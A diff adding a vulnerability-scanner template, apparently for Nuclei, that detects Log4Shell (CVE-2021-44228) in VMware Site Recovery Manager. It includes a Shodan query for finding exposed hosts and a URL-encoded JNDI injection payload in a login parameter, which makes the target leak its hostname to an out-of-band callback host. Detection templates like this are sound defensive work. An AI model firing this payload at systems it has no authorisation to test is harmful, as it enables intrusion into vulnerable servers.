@@ -1,0 +1,48 @@
+id: vmware-siterecovery-log4j-rce
+
+info:
+  name: VMware Site Recovery Manager - Log4j Remote Code Execution
+  author: akincibor
+  severity: critical
+  description: |
+    A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware Site Recovery Manager.
+  reference:
+    - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    shodan-query: title:"VMware Site Recovery Manager"
+  tags: cve,cve2021,jndi,log4j,rce,oast,vmware
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
